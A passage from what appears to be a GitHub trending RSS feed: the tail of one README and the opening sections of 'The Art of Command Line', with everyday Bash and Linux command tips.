&lt;h2&gt;&lt;a id="user-content-contact-info" class="anchor" aria-hidden="true" href="#contact-info"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contact info&lt;/h2&gt;
&lt;p&gt;Feel free to contact me to discuss any issues, questions, or comments.&lt;/p&gt;
&lt;p&gt;My contact info can be found on my &lt;a href="https://github.com/donnemartin"&gt;GitHub page&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;I am providing code and resources in this repository to you under an open source license.  Because this is my personal repository, the license you receive to my code and resources is from me and not my employer (Facebook).&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Copyright 2017 Donne Martin

Creative Commons Attribution 4.0 International License (CC BY 4.0)

http://creativecommons.org/licenses/by/4.0/
&lt;/code&gt;&lt;/pre&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>donnemartin</author><guid isPermaLink="false">https://github.com/donnemartin/system-design-primer</guid><pubDate>Sun, 19 Jan 2020 00:11:00 GMT</pubDate></item><item><title>jlevy/the-art-of-command-line #12 in All Languages, Today</title><link>https://github.com/jlevy/the-art-of-command-line</link><description>&lt;p&gt;&lt;i&gt;Master the command line, in one page&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;g-emoji class="g-emoji" alias="earth_africa" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f30d.png"&gt;🌍&lt;/g-emoji&gt;
&lt;em&gt;&lt;a href="README-cs.md"&gt;Čeština&lt;/a&gt; ∙ &lt;a href="README-de.md"&gt;Deutsch&lt;/a&gt; ∙ &lt;a href="README-el.md"&gt;Ελληνικά&lt;/a&gt; ∙ &lt;a href="README.md"&gt;English&lt;/a&gt; ∙ &lt;a href="README-es.md"&gt;Español&lt;/a&gt; ∙ &lt;a href="README-fr.md"&gt;Français&lt;/a&gt; ∙ &lt;a href="README-id.md"&gt;Indonesia&lt;/a&gt; ∙ &lt;a href="README-it.md"&gt;Italiano&lt;/a&gt; ∙ &lt;a href="README-ja.md"&gt;日本語&lt;/a&gt; ∙ &lt;a href="README-ko.md"&gt;한국어&lt;/a&gt; ∙ &lt;a href="README-pt.md"&gt;Português&lt;/a&gt; ∙ &lt;a href="README-ro.md"&gt;Română&lt;/a&gt; ∙ &lt;a href="README-ru.md"&gt;Русский&lt;/a&gt; ∙ &lt;a href="README-sl.md"&gt;Slovenščina&lt;/a&gt; ∙ &lt;a href="README-uk.md"&gt;Українська&lt;/a&gt; ∙ &lt;a href="README-zh.md"&gt;简体中文&lt;/a&gt; ∙ &lt;a href="README-zh-Hant.md"&gt;繁體中文&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-the-art-of-command-line" class="anchor" aria-hidden="true" href="#the-art-of-command-line"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;The Art of Command Line&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;Note: I'm looking for a new (and potentially paid) lead author to help expand this to a more comprehensive Guide. While it's very popoular, it could be both deeper and more helpful. If you like to write and are close to being an expert on this material and willing to consider helping, please drop me a note at josh (0x40) holloway.com. –&lt;a href="https://github.com/jlevy"&gt;jlevy&lt;/a&gt;, &lt;a href="https://www.holloway.com" rel="nofollow"&gt;Holloway&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#meta"&gt;Meta&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#basics"&gt;Basics&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#everyday-use"&gt;Everyday use&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#processing-files-and-data"&gt;Processing files and data&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#system-debugging"&gt;System debugging&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#one-liners"&gt;One-liners&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#obscure-but-useful"&gt;Obscure but useful&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#macos-only"&gt;macOS only&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#windows-only"&gt;Windows only&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#more-resources"&gt;More resources&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#disclaimer"&gt;Disclaimer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="cowsay.png"&gt;&lt;img src="cowsay.png" alt="curl -s 'https://raw.githubusercontent.com/jlevy/the-art-of-command-line/master/README.md' | egrep -o '\w+' | tr -d '`' | cowsay -W50" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Fluency on the command line is a skill often neglected or considered arcane, but it improves your flexibility and productivity as an engineer in both obvious and subtle ways. This is a selection of notes and tips on using the command-line that we've found useful when working on Linux. Some tips are elementary, and some are fairly specific, sophisticated, or obscure. This page is not long, but if you can use and recall all the items here, you know a lot.&lt;/p&gt;
&lt;p&gt;This work is the result of &lt;a href="AUTHORS.md"&gt;many authors and translators&lt;/a&gt;.
Some of this
&lt;a href="http://www.quora.com/What-are-some-lesser-known-but-useful-Unix-commands" rel="nofollow"&gt;originally&lt;/a&gt;
&lt;a href="http://www.quora.com/What-are-the-most-useful-Swiss-army-knife-one-liners-on-Unix" rel="nofollow"&gt;appeared&lt;/a&gt;
on &lt;a href="http://www.quora.com/What-are-some-time-saving-tips-that-every-Linux-user-should-know" rel="nofollow"&gt;Quora&lt;/a&gt;,
but it has since moved to GitHub, where people more talented than the original author have made numerous improvements.
&lt;a href="https://airtable.com/shrzMhx00YiIVAWJg" rel="nofollow"&gt;&lt;strong&gt;Please submit a question&lt;/strong&gt;&lt;/a&gt; if you have a question related to the command line. &lt;a href="/CONTRIBUTING.md"&gt;&lt;strong&gt;Please contribute&lt;/strong&gt;&lt;/a&gt; if you see an error or something that could be better!&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-meta" class="anchor" aria-hidden="true" href="#meta"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Meta&lt;/h2&gt;
&lt;p&gt;Scope:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This guide is both for beginners and the experienced. The goals are &lt;em&gt;breadth&lt;/em&gt; (everything important), &lt;em&gt;specificity&lt;/em&gt; (give concrete examples of the most common case), and &lt;em&gt;brevity&lt;/em&gt; (avoid things that aren't essential or digressions you can easily look up elsewhere). Every tip is essential in some situation or significantly saves time over alternatives.&lt;/li&gt;
&lt;li&gt;This is written for Linux, with the exception of the "&lt;a href="#macos-only"&gt;macOS only&lt;/a&gt;" and "&lt;a href="#windows-only"&gt;Windows only&lt;/a&gt;" sections. Many of the other items apply or can be installed on other Unices or macOS (or even Cygwin).&lt;/li&gt;
&lt;li&gt;The focus is on interactive Bash, though many tips apply to other shells and to general Bash scripting.&lt;/li&gt;
&lt;li&gt;It includes both "standard" Unix commands as well as ones that require special package installs -- so long as they are important enough to merit inclusion.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Notes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;To keep this to one page, content is implicitly included by reference. You're smart enough to look up more detail elsewhere once you know the idea or command to Google. Use &lt;code&gt;apt&lt;/code&gt;, &lt;code&gt;yum&lt;/code&gt;, &lt;code&gt;dnf&lt;/code&gt;, &lt;code&gt;pacman&lt;/code&gt;, &lt;code&gt;pip&lt;/code&gt; or &lt;code&gt;brew&lt;/code&gt; (as appropriate) to install new programs.&lt;/li&gt;
&lt;li&gt;Use &lt;a href="http://explainshell.com/" rel="nofollow"&gt;Explainshell&lt;/a&gt; to get a helpful breakdown of what commands, options, pipes etc. do.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-basics" class="anchor" aria-hidden="true" href="#basics"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Basics&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Learn basic Bash. Actually, type &lt;code&gt;man bash&lt;/code&gt; and at least skim the whole thing; it's pretty easy to follow and not that long. Alternate shells can be nice, but Bash is powerful and always available (learning &lt;em&gt;only&lt;/em&gt; zsh, fish, etc., while tempting on your own laptop, restricts you in many situations, such as using existing servers).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Learn at least one text-based editor well. The &lt;code&gt;nano&lt;/code&gt; editor is one of the simplest for basic editing (opening, editing, saving, searching). However, for the power user in a text terminal, there is no substitute for Vim (&lt;code&gt;vi&lt;/code&gt;), the hard-to-learn but venerable, fast, and full-featured editor. Many people also use the classic Emacs, particularly for larger editing tasks. (Of course, any modern software developer working on an extensive project is unlikely to use only a pure text-based editor and should also be familiar with modern graphical IDEs and tools.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Finding documentation:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Know how to read official documentation with &lt;code&gt;man&lt;/code&gt; (for the inquisitive, &lt;code&gt;man man&lt;/code&gt; lists the section numbers, e.g. 1 is "regular" commands, 5 is files/conventions, and 8 are for administration). Find man pages with &lt;code&gt;apropos&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Know that some commands are not executables, but Bash builtins, and that you can get help on them with &lt;code&gt;help&lt;/code&gt; and &lt;code&gt;help -d&lt;/code&gt;. You can find out whether a command is an executable, shell builtin or an alias by using &lt;code&gt;type command&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl cheat.sh/command&lt;/code&gt; will give a brief "cheat sheet" with common examples of how to use a shell command.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Learn about redirection of output and input using &lt;code&gt;&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;&lt;/code&gt; and pipes using &lt;code&gt;|&lt;/code&gt;. Know &lt;code&gt;&amp;gt;&lt;/code&gt; overwrites the output file and &lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt; appends. Learn about stdout and stderr.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Learn about file glob expansion with &lt;code&gt;*&lt;/code&gt; (and perhaps &lt;code&gt;?&lt;/code&gt; and &lt;code&gt;[&lt;/code&gt;...&lt;code&gt;]&lt;/code&gt;) and quoting and the difference between double &lt;code&gt;"&lt;/code&gt; and single &lt;code&gt;'&lt;/code&gt; quotes. (See more on variable expansion below.)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Be familiar with Bash job management: &lt;code&gt;&amp;amp;&lt;/code&gt;, &lt;strong&gt;ctrl-z&lt;/strong&gt;, &lt;strong&gt;ctrl-c&lt;/strong&gt;, &lt;code&gt;jobs&lt;/code&gt;, &lt;code&gt;fg&lt;/code&gt;, &lt;code&gt;bg&lt;/code&gt;, &lt;code&gt;kill&lt;/code&gt;, etc.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know &lt;code&gt;ssh&lt;/code&gt;, and the basics of passwordless authentication, via &lt;code&gt;ssh-agent&lt;/code&gt;, &lt;code&gt;ssh-add&lt;/code&gt;, etc.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Basic file management: &lt;code&gt;ls&lt;/code&gt; and &lt;code&gt;ls -l&lt;/code&gt; (in particular, learn what every column in &lt;code&gt;ls -l&lt;/code&gt; means), &lt;code&gt;less&lt;/code&gt;, &lt;code&gt;head&lt;/code&gt;, &lt;code&gt;tail&lt;/code&gt; and &lt;code&gt;tail -f&lt;/code&gt; (or even better, &lt;code&gt;less +F&lt;/code&gt;), &lt;code&gt;ln&lt;/code&gt; and &lt;code&gt;ln -s&lt;/code&gt; (learn the differences and advantages of hard versus soft links), &lt;code&gt;chown&lt;/code&gt;, &lt;code&gt;chmod&lt;/code&gt;, &lt;code&gt;du&lt;/code&gt; (for a quick summary of disk usage: &lt;code&gt;du -hs *&lt;/code&gt;). For filesystem management, &lt;code&gt;df&lt;/code&gt;, &lt;code&gt;mount&lt;/code&gt;, &lt;code&gt;fdisk&lt;/code&gt;, &lt;code&gt;mkfs&lt;/code&gt;, &lt;code&gt;lsblk&lt;/code&gt;. Learn what an inode is (&lt;code&gt;ls -i&lt;/code&gt; or &lt;code&gt;df -i&lt;/code&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Basic network management: &lt;code&gt;ip&lt;/code&gt; or &lt;code&gt;ifconfig&lt;/code&gt;, &lt;code&gt;dig&lt;/code&gt;, &lt;code&gt;traceroute&lt;/code&gt;, &lt;code&gt;route&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Learn and use a version control management system, such as &lt;code&gt;git&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know regular expressions well, and the various flags to &lt;code&gt;grep&lt;/code&gt;/&lt;code&gt;egrep&lt;/code&gt;. The &lt;code&gt;-i&lt;/code&gt;, &lt;code&gt;-o&lt;/code&gt;, &lt;code&gt;-v&lt;/code&gt;, &lt;code&gt;-A&lt;/code&gt;, &lt;code&gt;-B&lt;/code&gt;, and &lt;code&gt;-C&lt;/code&gt; options are worth knowing.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Learn to use &lt;code&gt;apt-get&lt;/code&gt;, &lt;code&gt;yum&lt;/code&gt;, &lt;code&gt;dnf&lt;/code&gt; or &lt;code&gt;pacman&lt;/code&gt; (depending on distro) to find and install packages. And make sure you have &lt;code&gt;pip&lt;/code&gt; to install Python-based command-line tools (a few below are easiest to install via &lt;code&gt;pip&lt;/code&gt;).&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-everyday-use" class="anchor" aria-hidden="true" href="#everyday-use"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Everyday use&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;In Bash, use &lt;strong&gt;Tab&lt;/strong&gt; to complete arguments or list all available commands and &lt;strong&gt;ctrl-r&lt;/strong&gt; to search through command history (after pressing, type to search, press &lt;strong&gt;ctrl-r&lt;/strong&gt; repeatedly to cycle through more matches, press &lt;strong&gt;Enter&lt;/strong&gt; to execute the found command, or hit the right arrow to put the result in the current line to allow editing).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In Bash, use &lt;strong&gt;ctrl-w&lt;/strong&gt; to delete the last word, and &lt;strong&gt;ctrl-u&lt;/strong&gt; to delete the content from current cursor back to the start of the line. Use &lt;strong&gt;alt-b&lt;/strong&gt; and &lt;strong&gt;alt-f&lt;/strong&gt; to move by word, &lt;strong&gt;ctrl-a&lt;/strong&gt; to move cursor to beginning of line,  &lt;strong&gt;ctrl-e&lt;/strong&gt; to move cursor to end of line, &lt;strong&gt;ctrl-k&lt;/strong&gt; to kill to the end of the line, &lt;strong&gt;ctrl-l&lt;/strong&gt; to clear the screen. See &lt;code&gt;man readline&lt;/code&gt; for all the default keybindings in Bash. There are a lot. For example &lt;strong&gt;alt-.&lt;/strong&gt; cycles through previous arguments, and &lt;strong&gt;alt-&lt;/strong&gt;* expands a glob.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Alternatively, if you love vi-style key-bindings, use &lt;code&gt;set -o vi&lt;/code&gt; (and &lt;code&gt;set -o emacs&lt;/code&gt; to put it back).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;For editing long commands, after setting your editor (for example &lt;code&gt;export EDITOR=vim&lt;/code&gt;), &lt;strong&gt;ctrl-x&lt;/strong&gt; &lt;strong&gt;ctrl-e&lt;/strong&gt; will open the current command in an editor for multi-line editing. Or in vi style, &lt;strong&gt;escape-v&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To see recent commands, use &lt;code&gt;history&lt;/code&gt;. Follow with &lt;code&gt;!n&lt;/code&gt; (where &lt;code&gt;n&lt;/code&gt; is the command number) to execute again. There are also many abbreviations you can use, the most useful probably being &lt;code&gt;!$&lt;/code&gt; for last argument and &lt;code&gt;!!&lt;/code&gt; for last command (see "HISTORY EXPANSION" in the man page). However, these are often easily replaced with &lt;strong&gt;ctrl-r&lt;/strong&gt; and &lt;strong&gt;alt-.&lt;/strong&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Go to your home directory with &lt;code&gt;cd&lt;/code&gt;. Access files relative to your home directory with the &lt;code&gt;~&lt;/code&gt; prefix (e.g. &lt;code&gt;~/.bashrc&lt;/code&gt;). In &lt;code&gt;sh&lt;/code&gt; scripts refer to the home directory as &lt;code&gt;$HOME&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To go back to the previous working directory: &lt;code&gt;cd -&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If you are halfway through typing a command but change your mind, hit &lt;strong&gt;alt-#&lt;/strong&gt; to add a &lt;code&gt;#&lt;/code&gt; at the beginning and enter it as a comment (or use &lt;strong&gt;ctrl-a&lt;/strong&gt;, &lt;strong&gt;#&lt;/strong&gt;, &lt;strong&gt;enter&lt;/strong&gt;). You can then return to it later via command history.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;xargs&lt;/code&gt; (or &lt;code&gt;parallel&lt;/code&gt;). It's very powerful. Note you can control how many items execute per line (&lt;code&gt;-L&lt;/code&gt;) as well as parallelism (&lt;code&gt;-P&lt;/code&gt;). If you're not sure if it'll do the right thing, use &lt;code&gt;xargs echo&lt;/code&gt; first. Also, &lt;code&gt;-I{}&lt;/code&gt; is handy. Examples:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      find &lt;span class="pl-c1"&gt;.&lt;/span&gt; -name &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;'&lt;/span&gt;*.py&lt;span class="pl-pds"&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class="pl-k"&gt;|&lt;/span&gt; xargs grep some_function
      cat hosts &lt;span class="pl-k"&gt;|&lt;/span&gt; xargs -I{} ssh root@{} hostname&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;pstree -p&lt;/code&gt; is a helpful display of the process tree.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;pgrep&lt;/code&gt; and &lt;code&gt;pkill&lt;/code&gt; to find or signal processes by name (&lt;code&gt;-f&lt;/code&gt; is helpful).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Know the various signals you can send processes. For example, to suspend a process, use &lt;code&gt;kill -STOP [pid]&lt;/code&gt;. For the full list, see &lt;code&gt;man 7 signal&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;nohup&lt;/code&gt; or &lt;code&gt;disown&lt;/code&gt; if you want a background process to keep running forever.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Check what processes are listening via &lt;code&gt;netstat -lntp&lt;/code&gt; or &lt;code&gt;ss -plat&lt;/code&gt; (for TCP; add &lt;code&gt;-u&lt;/code&gt; for UDP) or &lt;code&gt;lsof -iTCP -sTCP:LISTEN -P -n&lt;/code&gt; (which also works on macOS).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;See also &lt;code&gt;lsof&lt;/code&gt; and &lt;code&gt;fuser&lt;/code&gt; for open sockets and files.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;See &lt;code&gt;uptime&lt;/code&gt; or &lt;code&gt;w&lt;/code&gt; to know how long the system has been running.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Use &lt;code&gt;alias&lt;/code&gt; to create shortcuts for commonly used commands. For example, &lt;code&gt;alias ll='ls -latr'&lt;/code&gt; creates a new alias &lt;code&gt;ll&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Save aliases, shell settings, and functions you commonly use in &lt;code&gt;~/.bashrc&lt;/code&gt;, and &lt;a href="http://superuser.com/a/183980/7106" rel="nofollow"&gt;arrange for login shells to source it&lt;/a&gt;. This will make your setup available in all your shell sessions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Put the settings of environment variables as well as commands that should be executed when you login in &lt;code&gt;~/.bash_profile&lt;/code&gt;. Separate configuration will be needed for shells you launch from graphical environment logins and &lt;code&gt;cron&lt;/code&gt; jobs.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Synchronize your configuration files (e.g. &lt;code&gt;.bashrc&lt;/code&gt; and &lt;code&gt;.bash_profile&lt;/code&gt;) among various computers with Git.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Understand that care is needed when variables and filenames include whitespace. Surround your Bash variables with quotes, e.g. &lt;code&gt;"$FOO"&lt;/code&gt;. Prefer the &lt;code&gt;-0&lt;/code&gt; or &lt;code&gt;-print0&lt;/code&gt; options to enable null characters to delimit filenames, e.g. &lt;code&gt;locate -0 pattern | xargs -0 ls -al&lt;/code&gt; or &lt;code&gt;find / -print0 -type d | xargs -0 ls -al&lt;/code&gt;. To iterate on filenames containing whitespace in a for loop, set your IFS to be a newline only using &lt;code&gt;IFS=$'\n'&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;In Bash scripts, use &lt;code&gt;set -x&lt;/code&gt; (or the variant &lt;code&gt;set -v&lt;/code&gt;, which logs raw input, including unexpanded variables and comments) for debugging output. Use strict modes unless you have a good reason not to: Use &lt;code&gt;set -e&lt;/code&gt; to abort on errors (nonzero exit code). Use &lt;code&gt;set -u&lt;/code&gt; to detect unset variable usages. Consider &lt;code&gt;set -o pipefail&lt;/code&gt; too, to abort on errors within pipes (though read up on it more if you do, as this topic is a bit subtle). For more involved scripts, also use &lt;code&gt;trap&lt;/code&gt; on EXIT or ERR. A useful habit is to start a script like this, which will make it detect and abort on common errors and print a message:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      &lt;span class="pl-c1"&gt;set&lt;/span&gt; -euo pipefail
      &lt;span class="pl-c1"&gt;trap&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;echo 'error: Script failed: see failed command above'&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt; ERR&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;In Bash scripts, subshells (written with parentheses) are convenient ways to group commands. A common example is to temporarily move to a different working directory, e.g.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; do something in current dir&lt;/span&gt;
      (cd /some/other/dir &lt;span class="pl-k"&gt;&amp;amp;&amp;amp;&lt;/span&gt; other-command)
      &lt;span class="pl-c"&gt;&lt;span class="pl-c"&gt;#&lt;/span&gt; continue in original dir&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;In Bash, note there are lots of kinds of variable expansion. Checking a variable exists: &lt;code&gt;${name:?error message}&lt;/code&gt;. For example, if a Bash script requires a single argument, just write &lt;code&gt;input_file=${1:?usage: $0 input_file}&lt;/code&gt;. Using a default value if a variable is empty: &lt;code&gt;${name:-default}&lt;/code&gt;. If you want to have an additional (optional) parameter added to the previous example, you can use something like &lt;code&gt;output_file=${2:-logfile}&lt;/code&gt;. If &lt;code&gt;$2&lt;/code&gt; is omitted and thus empty, &lt;code&gt;output_file&lt;/code&gt; will be set to &lt;code&gt;logfile&lt;/code&gt;. Arithmetic expansion: &lt;code&gt;i=$(( (i + 1) % 5 ))&lt;/code&gt;. Sequences: &lt;code&gt;{1..10}&lt;/code&gt;. Trimming of strings: &lt;code&gt;${var%suffix}&lt;/code&gt; and &lt;code&gt;${var#prefix}&lt;/code&gt;. For example if &lt;code&gt;var=foo.pdf&lt;/code&gt;, then &lt;code&gt;echo ${var%.pdf}.txt&lt;/code&gt; prints &lt;code&gt;foo.txt&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
